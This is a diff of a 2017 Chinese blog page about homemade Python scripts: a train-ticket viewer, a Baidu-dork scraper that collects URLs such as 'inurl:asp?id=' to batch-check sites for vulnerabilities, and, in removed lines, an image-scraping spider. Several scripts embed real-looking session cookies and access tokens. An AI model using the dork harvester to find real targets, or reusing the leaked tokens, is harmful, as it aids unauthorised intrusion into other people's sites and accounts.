@@ -1,12 +1,135 @@
-<?xml version="1.0" encoding="utf-8"?>
-<search>
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>自制python小工具 | warmeng</title>
+  <meta name="author" content="Mr.w">
+  
+  <meta name="description" content="2017上半年结束了！终于来到一个有网的地方！">
   
   
-    
-    <entry>
-      <title><![CDATA[自制python小工具]]></title>
-      <url>http://www.warmeng.com/2017/07/01/pypypy/</url>
-      <content type="html"><![CDATA[<p>2017上半年结束了！终于来到一个有网的地方！</p>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="自制python小工具"/>
+  <meta property="og:site_name" content="warmeng"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">warmeng</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="所有文章的匯總.">
+			  <i class=""></i>歸檔
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="所有文章的分類.">
+			  <i class=""></i>分類
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="所有文件的標籤.">
+			  <i class=""></i>標籤
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="新垣結衣的小跟班.">
+			  <i class=""></i>關於我
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 自制python小工具</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>2017上半年结束了！终于来到一个有网的地方！</p>
 <a id="more"></a>
 <h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>学着写了些python的小玩意，记录一下。感谢<a href="https://www.shiyanlou.com/" target="_blank" rel="external">实验楼</a>.</p>
 <h2 id="12306查看器"><a href="#12306查看器" class="headerlink" title="12306查看器"></a>12306查看器</h2><p>输入地名，不用登录12306，查看铁路交通信息。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from docopt import docopt</div><div class="line">from prettytable import PrettyTable</div><div class="line">from colorama import init, Fore</div><div class="line"></div><div class="line">from stations import stations</div><div class="line"></div><div class="line"></div><div class="line">init()</div><div class="line"></div><div class="line">class TrainsCollection:</div><div class="line"></div><div class="line">    header = <span class="string">'车次 车站 时间 历时 一等 二等 软卧 硬卧 硬座 无座'</span>.split()</div><div class="line"></div><div class="line">    def __init__(self, available_trains, options):</div><div class="line">        <span class="string">""</span><span class="string">"查询到的火车班次集合</span></div><div class="line"></div><div class="line">        :param available_trains: 一个列表, 包含可获得的火车班次, 每个</div><div class="line">                                 火车班次是一个字典</div><div class="line">        :param options: 查询的选项, 如高铁, 动车, etc...</div><div class="line">        "<span class="string">""</span></div><div class="line">        self.available_trains = available_trains</div><div class="line">        self.options = options</div><div class="line"></div><div class="line">    def _get_duration(self, raw_train):</div><div class="line">        duration = raw_train.get(<span class="string">'lishi'</span>).replace(<span class="string">':'</span>, <span class="string">'小时'</span>) + <span class="string">'分'</span></div><div class="line">        <span class="keyword">if</span> duration.startswith(<span class="string">'00'</span>):</div><div class="line">            <span class="built_in">return</span> duration[4:]</div><div class="line">        <span class="keyword">if</span> duration.startswith(<span class="string">'0'</span>):</div><div class="line">            <span class="built_in">return</span> duration[1:]</div><div class="line">        <span class="built_in">return</span> duration</div><div class="line"></div><div class="line">    @property</div><div class="line">    def trains(self):</div><div class="line">        <span class="keyword">for</span> raw_train <span class="keyword">in</span> self.available_trains:</div><div class="line">            train_no = raw_train[<span class="string">'station_train_code'</span>]</div><div class="line">            initial = train_no[0].lower()</div><div class="line">            <span class="keyword">if</span> not self.options or initial <span class="keyword">in</span> self.options:</div><div class="line">                train = [</div><div class="line">                    train_no,</div><div class="line">                    <span class="string">'\n'</span>.join([Fore.GREEN + raw_train[<span class="string">'from_station_name'</span>] + Fore.RESET,</div><div class="line">                               Fore.RED + raw_train[<span class="string">'to_station_name'</span>] + Fore.RESET]),</div><div class="line">                    <span class="string">'\n'</span>.join([Fore.GREEN + raw_train[<span class="string">'start_time'</span>] + Fore.RESET,</div><div class="line">                               Fore.RED + raw_train[<span class="string">'arrive_time'</span>] + Fore.RESET]),</div><div class="line">                    self._get_duration(raw_train),</div><div class="line">                    raw_train[<span class="string">'zy_num'</span>],</div><div class="line">                    raw_train[<span class="string">'ze_num'</span>],</div><div class="line">                    raw_train[<span class="string">'rw_num'</span>],</div><div class="line">                    raw_train[<span class="string">'yw_num'</span>],</div><div class="line">                    raw_train[<span class="string">'yz_num'</span>],</div><div class="line">                    raw_train[<span class="string">'wz_num'</span>],</div><div class="line">                ]</div><div class="line">                yield train</div><div class="line"></div><div class="line">    def pretty_print(self):</div><div class="line">        pt = PrettyTable()</div><div class="line">        pt._set_field_names(self.header)</div><div class="line">        <span class="keyword">for</span> train <span class="keyword">in</span> self.trains:</div><div class="line">            pt.add_row(train)</div><div class="line">        <span class="built_in">print</span>(pt)</div><div class="line"></div><div class="line"></div><div class="line">def cli():</div><div class="line">    <span class="string">""</span><span class="string">"Command-line interface"</span><span class="string">""</span></div><div class="line">    arguments = docopt(__doc__)</div><div class="line">    from_station = stations.get(arguments[<span class="string">'&lt;from&gt;'</span>])</div><div class="line">    to_station = stations.get(arguments[<span class="string">'&lt;to&gt;'</span>])</div><div class="line">    date = arguments[<span class="string">'&lt;date&gt;'</span>]</div><div class="line">    url = (<span class="string">'https://kyfw.12306.cn/otn/lcxxcx/query?'</span></div><div class="line">           <span class="string">'purpose_codes=ADULT&amp;queryDate=&#123;&#125;&amp;'</span></div><div class="line">           <span class="string">'from_station=&#123;&#125;&amp;to_station=&#123;&#125;'</span>).format(</div><div class="line">                date, from_station, to_station</div><div class="line">           )</div><div class="line">    options = <span class="string">''</span>.join([</div><div class="line">        key <span class="keyword">for</span> key, value <span class="keyword">in</span> arguments.items() <span class="keyword">if</span> value is True</div><div class="line">    ])</div><div class="line">    r = requests.get(url, verify=False)</div><div class="line">    available_trains = r.json()[<span class="string">'data'</span>][<span class="string">'datas'</span>]</div><div class="line">    TrainsCollection(available_trains, options).pretty_print()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    cli()</div></pre></td></tr></table></figure></p>
@@ -18,189 +141,160 @@
 <h2 id="渗透语法收集器"><a href="#渗透语法收集器" class="headerlink" title="渗透语法收集器"></a>渗透语法收集器</h2><p>还是一个爬虫，输入百度语法，或者改动一下谷歌语法，收集该语法下的url，批量验证漏洞。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line">import urllib.request</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">import requests</div><div class="line"></div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">'Host'</span>] = <span class="string">'www.baidu.com'</span></div><div class="line">header[<span class="string">'User-Agent'</span>] = <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0)Gecko/20100101 Firefox/54.0'</span></div><div class="line">header[<span class="string">'Accept'</span>] = <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span></div><div class="line">header[<span class="string">'Accept-Language'</span>] = <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span></div><div class="line">header[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip, deflate, br'</span></div><div class="line">header[<span class="string">'Cookie'</span>] = <span class="string">'BAIDUID=7FF6B65C12082D4620B627B8C3D42995:FG=1; BIDUPSID=7FF6B65C12082D4620B627B8C3D42995; PSTM=1497660046; BD_UPN=13314352; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; sug=3; sugstore=0; ORIGIN=0; bdime=0; BDUSS=1J2ZHNYcHZvTUR0fkhLa2lDMzR6ZnRVLTVkUzV3SnZaSUhLc3FvTGFwZ1RSSEJaSVFBQUFBJCQAAAAAAAAAAAEAAAD0POxU0sC-ybjftffs4QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABO3SFkTt0hZN; __cfduid=d9f32e301169f6f07bf08af4721364b601498009206; BDRCVFR[Fc9oatPmwxn]=G01CoNuskzfuh-zuyuEXAPCpy49QhP8; BD_CK_SAM=1; PSINO=5; H_PS_PSSID=23083_1423_21117_17001_21928_20927; B64_BOT=1; BD_HOME=1; BDRCVFR[feWj1Vr5u3D]=I67x6TjHwwYf0; rsv_jmp_slow=1498181697500; H_PS_645EC=0811GQcKJ8F%2Fxv6BYKHoJME8JXNS%2BKoas3Nuspr0t7zbaHYC5OVeoy2Dtls'</span></div><div class="line">header[<span class="string">'Connection'</span>] = <span class="string">'close'</span></div><div class="line">header[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line"><span class="comment"># header['X-Forwarded-For'] = '1.1.1.1'</span></div><div class="line"><span class="comment"># header[''] = ''</span></div><div class="line"><span class="comment"># header[''] = ''</span></div><div class="line"></div><div class="line">indexUrl = <span class="string">'https://www.baidu.com'</span></div><div class="line"></div><div class="line">word = input(<span class="string">"请输入百度语法："</span>)</div><div class="line"><span class="comment"># word = 'inurl:asp?id='</span></div><div class="line"></div><div class="line">page = <span class="string">'&amp;pn='</span></div><div class="line">page_number = 0</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> page_number <span class="keyword">in</span> range(0,200,10):</div><div class="line">    targetUrl = indexUrl + <span class="string">'/s?wd='</span> + word + page + str(page_number)</div><div class="line">    results = requests.get(targetUrl, headers=header,timeout=15)</div><div class="line">    results.raise_for_status()</div><div class="line">    detail = BeautifulSoup(results.content, <span class="string">'lxml'</span>)</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> detail.find_all(<span class="string">'div'</span>):</div><div class="line"></div><div class="line">         link = x.get(<span class="string">'data-tools'</span>)</div><div class="line"></div><div class="line">         <span class="keyword">if</span> link:</div><div class="line">             try:</div><div class="line">                 url = str(link)[link.find(<span class="string">'"url":"'</span>):]</div><div class="line">                 url = url[7:-2]</div><div class="line">                 final_url = urllib.request.urlopen(url).geturl()</div><div class="line">                 <span class="keyword">if</span> word[6:] <span class="keyword">in</span> final_url:</div><div class="line">                     f = open(<span class="string">'C:/Users/qgs-wm/PycharmProjects/untitled/word.txt'</span>,<span class="string">'a+'</span>)</div><div class="line">                     f.write(final_url+<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">             except:</div><div class="line">                 pass</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">print</span>(<span class="string">'end!'</span>)</div></pre></td></tr></table></figure></p>
 <p>思考：k8的s2验证工具有批量的功能，所以……或者,玩玩sqlmap？</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>练习才能完美，多练练总是好的。</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 杂项 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> python </tag>
-            
-        </tags>
-        
-    </entry>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
     
-    <entry>
-      <title><![CDATA[爬虫实战经历]]></title>
-      <url>http://www.warmeng.com/2017/06/09/spider/</url>
-      <content type="html"><![CDATA[<p>毕业的东西总算全部搞完了，有闲情来弄博客了，毕业还挺伤感的。</p>
-<a id="more"></a>
-<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>由老师给的一个兼职任务，对户型图网站的图片的抓取，整个端午节都在研究这个东西，总算是弄出来了。</p>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>目标网站为<a href="https://www.kujiale.com/huxing/reside/,&quot;title&quot;" target="_blank" rel="external">户型图</a> 。<br>打开robots.txt发现目标网站的网站地图。<a href="http://www.kujiale.com/sitemap_index.xml" target="_blank" rel="external">网站地图</a> 。<br>根据网站地图收集所需要的url。根据下面代码爬取到所有的loc标签，通过标签下载下来所有的loc的url。<br>使用subline通过正则表达式find出所有带有huxing/hangzhou的url。<br>使用脚本对每个url进行访问。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import random</div><div class="line">import time</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">import re</div><div class="line"></div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"Host"</span>] = <span class="string">"www.kujiale.com"</span></div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate, br"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"KSESSIONID=d98ab2aa-8e73-4475-a1d3-b6b9ec32131c; gr_user_id=2c1c9985-db0d-4631-bfcf-9badbfd90ff7; Hm_lvt_bd8fd4c378d7721976f466053bd4a855=1495932728,1496019873; _ga=GA1.2.2058694673.1495932730; _gid=GA1.2.1642389268.1496019877; hasShownFootAd=true; kjl_sessionid=7843d03a-05e9-41eb-acaa-fc745a0c29a1; qqconn_access_token=571959B96EAFD7B00EF59A830D5A04FA; qqconn_openid=7F1637AF553192C0210D62BD83266049; qhssokey=3FO4K9RIQKVTVK7O138C; qhssokeyid=VK7O138C; qhssokeycheck=3FO4K9RIQKVT; 2017-05-28-sign-3FO4K9RIQKVT=false; landingpageurl=http://www.kujiale.com/huxing/reside/; 2017-05-29-sign-3FO4K9RIQKVT=false; kjl_usercityid=175; gr_session_id_a4a13a22eb51522b=b58ac865-047b-4767-a85d-b50198e13b9b; gr_cs1_b58ac865-047b-4767-a85d-b50198e13b9b=userId%3A3FO4K9RIQKVT; JSESSIONID=1o61l8us4a7rwtfvyj8mntc5y; Hm_lpvt_bd8fd4c378d7721976f466053bd4a855=1496019877"</span></div><div class="line">header[<span class="string">"Connection"</span>] = <span class="string">"keep-alive"</span></div><div class="line"></div><div class="line"></div><div class="line">def dowloadPic(imageUrl, filePath):</div><div class="line">    r = requests.get(imageUrl)</div><div class="line">    with open(filePath, <span class="string">"wb"</span>) as code:</div><div class="line">        code.write(r.content)</div><div class="line">indexUrl = <span class="string">"https://www.kujiale.com/sitemap_index.xml"</span></div><div class="line"></div><div class="line"></div><div class="line">results = request.get(indexUrl, headers=header)<span class="comment">#进入1级地图并且遍历</span></div><div class="line">detail = str(BeautifulSoup(results.content,<span class="string">"lxml"</span>))</div><div class="line">links = re.findall(<span class="string">'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>,detail)</div><div class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</div><div class="line">  link2 = str(link)</div><div class="line">  results2 = request.get(link2,headers=header)<span class="comment">#2级地图并且遍历</span></div><div class="line">  detail2 = str(BeautifulSoup(results2.content,<span class="string">'lxml'</span>))</div><div class="line">  jieguos = re.findall(<span class="string">'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>,detail2)</div><div class="line">  <span class="keyword">for</span> jieguo <span class="keyword">in</span> jieguos:</div><div class="line">      jieguo2 = str(jieguo)</div><div class="line">      <span class="built_in">print</span> jieguo2</div><div class="line">      w = open(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/666.txt"</span>, <span class="string">"a+"</span>)</div><div class="line">      w.write(jieguo2 + <span class="string">'\r\n'</span>)</div></pre></td></tr></table></figure></p>
-<h2 id="信息筛选"><a href="#信息筛选" class="headerlink" title="信息筛选"></a>信息筛选</h2><p>筛选的的结果如图所示:<img src="/images/20170612/1.png" alt="">，然后讲所筛选的url进行访问，通过正则找到带有目标的jpg url<br>然后讲其下载，如下面代码所示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">import re</div><div class="line">import os</div><div class="line">import random</div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"Host"</span>] = <span class="string">"www.kujiale.com"</span></div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate, br"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"KSESSIONID=d98ab2aa-8e73-4475-a1d3-b6b9ec32131c; gr_user_id=2c1c9985-db0d-4631-bfcf-9badbfd90ff7; Hm_lvt_bd8fd4c378d7721976f466053bd4a855=1495932728,1496019873,1496075232,1496075460; _ga=GA1.2.2058694673.1495932730; _gid=GA1.2.194016103.1496105563; qqconn_access_token=571959B96EAFD7B00EF59A830D5A04FA; qqconn_openid=7F1637AF553192C0210D62BD83266049; qhssokey=3FO4K9RIQKVT7QT1GWWPW; qhssokeyid=7QT1GWWPW; qhssokeycheck=3FO4K9RIQKVT; kjl_sessionid=60u1zks6yn631tkr5yk8kwn9p; Hm_lvt_55cf859f19ff9efb2389c232abf347a6=1496072964; UM_distinctid=15c54e5c72e477-03018d1179e9b4-49526a-fa000-15c54e5c72f247; _jzqa=1.4592844170854785500.1496072964.1496072964.1496072964.1; _jzqckmp=1; 2017-05-30-sign-3FO4K9RIQKVT=false; CNZZDATA1000449964=260878689-1496072838-%7C1496072838; Hm_lpvt_bd8fd4c378d7721976f466053bd4a855=1496105563; JSESSIONID=kvqb4k8qggoe1p8yxprk63yxj; gr_session_id_a4a13a22eb51522b=b707aa5c-e8f7-4d84-8813-e94c309b1f7c; gr_cs1_b707aa5c-e8f7-4d84-8813-e94c309b1f7c=userId%3A3FO4K9RIQKVT; DIYSERVERS=1"</span></div><div class="line">header[<span class="string">"Connection"</span>] = <span class="string">"keep-alive"</span></div><div class="line"></div><div class="line"></div><div class="line">def dowloadPic(imageUrl, filePath):</div><div class="line">    try:</div><div class="line">        r = requests.get(imageUrl)</div><div class="line">        with open(filePath, <span class="string">"wb"</span>) as code:</div><div class="line">            code.write(r.content)</div><div class="line">    except:</div><div class="line">        pass</div><div class="line">f = open(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/hangzhou1.txt"</span>, <span class="string">"r"</span>)<span class="comment">#打开本地杭州url</span></div><div class="line">lines = f.readlines()</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">    indexUrl = line</div><div class="line">    results = request.get(line, headers=header)</div><div class="line">    titlename = str(BeautifulSoup(results.content).title)</div><div class="line">    titlename = titlename[7:-7]</div><div class="line">    name = line[30:]+str(titlename)</div><div class="line">    <span class="built_in">print</span> name</div><div class="line">    try:</div><div class="line">        results = request.get(indexUrl, headers=header)</div><div class="line">        detail = str(BeautifulSoup(results.content,<span class="string">"lxml"</span>))</div><div class="line">    except:</div><div class="line">        pass</div><div class="line"></div><div class="line">    tupians = re.findall(r<span class="string">'src="https://(.*).jpg@!480w"'</span>,detail)<span class="comment">#找到带有jpg的url</span></div><div class="line">    <span class="keyword">if</span> len(tupians)!=0:</div><div class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/"</span> + name.strip()):<span class="comment">#判断分类文件夹是否存在</span></div><div class="line">            pass</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            os.mkdir(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/"</span> + name.strip())<span class="comment">#创建分类的文件夹</span></div><div class="line">            file = open(<span class="string">"/Users/nevermore/Desktop/HUXINGTU/"</span> + name.strip() + <span class="string">"/2.txt"</span>, <span class="string">'w'</span>)<span class="comment">#创建分类文件下的2.txt</span></div><div class="line">            file.close()</div><div class="line">        <span class="keyword">for</span> tupian <span class="keyword">in</span> tupians:</div><div class="line">          tupian = <span class="string">'https://'</span> + str(tupian) + <span class="string">'.jpg'</span></div><div class="line"></div><div class="line">          path = <span class="string">'/Users/nevermore/Desktop/HUXINGTU/'</span>+name.strip()+<span class="string">'/'</span>+str(random.randint(0,1000000)) +<span class="string">'.jpg'</span></div><div class="line"></div><div class="line">          <span class="built_in">print</span> tupian</div><div class="line"></div><div class="line">          dowloadPic(tupian,path)</div></pre></td></tr></table></figure></p>
-<p>开始批量的下载，在寝室下载因为网络问题，反而没有被反爬监测出来，跑到学校的电脑上爬，1分钟就被监测出来了。<br>只好加个sleep了。下载的东西如下图所示:<img src="/images/20170612/2.png" alt="">，<img src="/images/20170612/3.png" alt="">。<br>这里只取少量，所有的杭州户型图已经全部爬取完毕在学校的电脑里。</p>
-<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>毕业设计就是爬虫和反爬虫，现在又正经的玩了一遍，整个过程中遇到了很多的问题和麻烦但也乐在其中。</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 实战过程 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 实战 </tag>
-            
-            <tag> python </tag>
-            
-        </tags>
-        
-    </entry>
     
-    <entry>
-      <title><![CDATA[提权和lcx的使用]]></title>
-      <url>http://www.warmeng.com/2017/04/19/r&amp;l/</url>
-      <content type="html"><![CDATA[<p>小小的纪录一下提权的小攻略和lcx转发的小操作。</p>
-<a id="more"></a>
-<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>毕业设计真的烦！写个博客换换心情！</p>
